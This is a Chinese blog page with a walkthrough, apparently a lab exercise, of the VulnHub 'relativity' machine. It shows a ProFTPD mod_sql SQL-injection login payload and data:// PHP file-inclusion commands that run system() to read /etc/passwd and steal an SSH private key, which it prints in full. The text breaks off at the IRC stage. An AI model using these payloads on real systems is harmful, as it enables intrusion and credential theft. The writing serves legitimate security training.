@@ -1,0 +1,705 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub /dev/random：relativity (v1.0.1) | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="&#x2F;dev&#x2F;random: relativity (v1.0.1)项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;devrandom&#x2F;relativity_1.0.1.zip 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  80 端口是静态页面，只有一张图片  观察到 banner 有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub &#x2F;dev&#x2F;random：relativity (v1.0.1)">
+<meta property="og:url" content="http://example.com/2026/04/01/dev-random%20relativity%20(v1.0.1)/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="&#x2F;dev&#x2F;random: relativity (v1.0.1)项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;devrandom&#x2F;relativity_1.0.1.zip 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  80 端口是静态页面，只有一张图片  观察到 banner 有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b3a29bb08ad63f9c7a7e0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b3a48bb08ad63f9c7a7e3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b3a66681ba7926cd9ed85.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b796a681ba7926cdab197.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b7a3b681ba7926cdab1af.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b7942681ba7926cdab194.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b7bc9681ba7926cdab7cf.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8140681ba7926cdadef7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b82b3681ba7926cdae8d2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8298681ba7926cdae825.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b83a2681ba7926cdaecd5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b84d6681ba7926cdb19bb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8537681ba7926cdb19bd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8648681ba7926cdb19cf.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b86a1681ba7926cdb19d1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8700681ba7926cdb19e0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b87db681ba7926cdb19eb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b88bc681ba7926cdb19f5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8a26681ba7926cdb1a1c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8b7d681ba7926cdb1a37.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b8bea681ba7926cdb1a39.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b96b6681ba7926cdb2529.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9747681ba7926cdb252e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b97c6681ba7926cdb2532.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b994d681ba7926cdb2541.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b984e681ba7926cdb2533.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9861681ba7926cdb253d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9bef681ba7926cdb254f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9c42681ba7926cdb2552.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9cef681ba7926cdb2554.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9d86681ba7926cdb2557.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697b9f0f681ba7926cdb2563.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/697ba0c0681ba7926cdb3340.png">
+<meta property="article:published_time" content="2026-04-01T08:15:00.000Z">
+<meta property="article:modified_time" content="2026-04-01T09:07:10.396Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="SQL 注入">
+<meta property="article:tag" content="内网穿透">
+<meta property="article:tag" content="弱口令">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/697b3a29bb08ad63f9c7a7e0.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub /dev/random：relativity (v1.0.1)">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub /dev/random：relativity (v1.0.1)</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dev-random-relativity-v1-0-1"><span class="toc-number">1.</span> <span class="toc-text">&#x2F;dev&#x2F;random: relativity (v1.0.1)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.1.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mod-sql%EF%BC%88CVE-2009-0542%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">mod_sql（CVE-2009-0542）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-number">1.2.</span> <span class="toc-text">LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#page"><span class="toc-number">1.2.1.</span> <span class="toc-text">page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.3.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E8%BD%AC%E5%8F%91"><span class="toc-number">1.4.1.</span> <span class="toc-text">SSH 转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UnrealIRCd%EF%BC%88CVE-2010-2075%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">UnrealIRCd（CVE-2010-2075）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.6.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.6.2.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-dev-random relativity (v1.0.1)" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-01T08:15:00.000Z" itemprop="datePublished">2026-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-04-01</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="dev-random-relativity-v1-0-1"><a href="#dev-random-relativity-v1-0-1" class="headerlink" title="&#x2F;dev&#x2F;random: relativity (v1.0.1)"></a>&#x2F;dev&#x2F;random: relativity (v1.0.1)</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/devrandom/relativity_1.0.1.zip">https://download.vulnhub.com/devrandom/relativity_1.0.1.zip</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/item/697b3a29bb08ad63f9c7a7e0.png"></p>
+<p>80 端口是静态页面，只有一张图片</p>
+<p><img src="https://pic1.imgdb.cn/item/697b3a48bb08ad63f9c7a7e3.png"></p>
+<p>观察到 banner 有一个 <code>mod_sql</code></p>
+<p><img src="https://pic1.imgdb.cn/item/697b3a66681ba7926cd9ed85.png"></p>
+<p><code>mod_sql</code> 是 ProFTPD 用于支持数据库后端验证的一个知名模块</p>
+<p>明确使用了 SQL 模块，说明该 FTP 的账号密码并不是存储在 <code>/etc/shadow</code> 等系统文件中，而是存储在后端的数据库（如 MySQL、PostgreSQL）中</p>
+<p>继续让 AI 吐出历史 CVE</p>
+<p><img src="https://pic1.imgdb.cn/item/697b796a681ba7926cdab197.png"></p>
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="mod-sql（CVE-2009-0542）"><a href="#mod-sql（CVE-2009-0542）" class="headerlink" title="mod_sql（CVE-2009-0542）"></a>mod_sql（CVE-2009-0542）</h3><p>在 Exploit DB 中搜索到历史 POC</p>
+<p><img src="https://pic1.imgdb.cn/item/697b7a3b681ba7926cdab1af.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 测试发现需要将结尾的注释符 <span class="comment">-- 替换成 #</span></span><br><span class="line"><span class="keyword">USER</span> <span class="operator">%</span><span class="string">&#x27;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; #</span></span><br></pre></td></tr></table></figure>
+
+<p>账号输入上面的 Payload，密码则按照 POC 的描述输入 1</p>
+<p>成功登录进去</p>
+<p><img src="https://pic1.imgdb.cn/item/697b7942681ba7926cdab194.png"></p>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>发现网站下有个隐藏文件</p>
+<p><img src="https://pic1.imgdb.cn/item/697b7bc9681ba7926cdab7cf.png"></p>
+<p>从 Web 访问这个目录多了一个页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0f756638e0737f4a0de1c53bf8937a08</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b8140681ba7926cdadef7.png"></p>
+<p>几个页面点着看发现 URL 参数中的 <code>page</code> 一直在变化，且值是文件名</p>
+<p><img src="https://pic1.imgdb.cn/item/697b82b3681ba7926cdae8d2.png"></p>
+<p>尝试任意文件读取不行</p>
+<p><img src="https://pic1.imgdb.cn/item/697b8298681ba7926cdae825.png"></p>
+<p>再尝试下通过 <code>data</code> 伪协议打本地文件包含</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain, &lt;?php system(&quot;whoami&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b83a2681ba7926cdaecd5.png"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>查看 <code>etc/passwd</code> 文件内容发现有两个普通用户</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,%20&lt;?php%20system(&quot;cat%20/etc/passwd&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b84d6681ba7926cdb19bb.png"></p>
+<p>发现 <code>mauk</code> 用户有读权限</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,%20&lt;?php%20system(&quot;ls%20-l%20/home&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b8537681ba7926cdb19bd.png"></p>
+<p>加上 <code>-a</code> 参数查看有哪些文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,%20&lt;?php%20system(&quot;ls%20-la%20/home/mauk&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b8648681ba7926cdb19cf.png"></p>
+<p>发现有 <code>.ssh</code> 文件夹，进去看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,%20&lt;?php%20system(&quot;ls%20-la%20/home/mauk/.ssh&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b86a1681ba7926cdb19d1.png"></p>
+<p>居然有私钥，窃取出来远程连接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,%20&lt;?php%20system(&quot;cat%20/home/mauk/.ssh/id_rsa&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b8700681ba7926cdb19e0.png"></p>
+<p>让 AI 格式化下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0</span><br><span class="line">9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ</span><br><span class="line">5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6</span><br><span class="line">zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN</span><br><span class="line">ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd</span><br><span class="line">xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd</span><br><span class="line">tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord</span><br><span class="line">jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v</span><br><span class="line">f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH</span><br><span class="line">r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6</span><br><span class="line">Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W</span><br><span class="line">BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG</span><br><span class="line">MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7</span><br><span class="line">szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht</span><br><span class="line">YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ</span><br><span class="line">+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy</span><br><span class="line">3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H</span><br><span class="line">Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x</span><br><span class="line">3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0</span><br><span class="line">ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b</span><br><span class="line">dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV</span><br><span class="line">J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF</span><br><span class="line">ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j</span><br><span class="line">bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg</span><br><span class="line">aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b87db681ba7926cdb19eb.png"></p>
+<p>修改权限后成功连接上用户 <code>mauk</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─# ssh -i /tmp/.ssh/id_rsa \</span><br><span class="line">-o PubkeyAcceptedKeyTypes=+ssh-rsa \</span><br><span class="line">-o HostKeyAlgorithms=+ssh-rsa \</span><br><span class="line">-o PubkeyAcceptedAlgorithms=+ssh-rsa \</span><br><span class="line">mauk@192.168.187.162</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b88bc681ba7926cdb19f5.png"></p>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH-转发"><a href="#SSH-转发" class="headerlink" title="SSH 转发"></a>SSH 转发</h3><p>登录上来发现没权限没 <code>wget</code> 命令，只能找找别的一些文件看有没有作用了</p>
+<p>做信息收集发现该用户 <code>.bash_history</code> 文件有内容，于是查看</p>
+<p><img src="https://pic1.imgdb.cn/item/697b8a26681ba7926cdb1a1c.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>-f</code> 参数</strong></p>
+<ul>
+<li>作用：让 SSH 在认证完成后转到后台运行</li>
+</ul>
+<p><strong><code>-R 6667:127.0.0.1:6667</code> 参数</strong></p>
+<ul>
+<li><code>-R</code>：建立远程端口转发</li>
+<li>格式：<code>-R [远程主机:]远程端口:本地主机:本地端口</code></li>
+<li>具体含义：<ul>
+<li>完整解释：将远程服务器（192.168.144.228）的 6667 端口转发到本地机器的 6667 端口</li>
+</ul>
+</li>
+</ul>
+<p><strong><code>-N</code> 参数</strong></p>
+<ul>
+<li>作用：不执行远程命令</li>
+<li>效果：只建立隧道连接，不打开远程 shell 会话</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/item/697b8b7d681ba7926cdb1a37.png"></p>
+<p>跟着 AI 的结果去排查，首先第一个就可以排除，因为只有一台靶机</p>
+<p>那么接下来来看第二个，看看有没有这个端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/697b8bea681ba7926cdb1a39.png"></p>
+<p>真有 6667 端口</p>
+<p>6667 端口是 <strong>IRC</strong> 服务的标准端口，IRC 是一种古老的、基于文本的实时聊天协议</p>
+<p>看看 AI 的渗透思路</p>
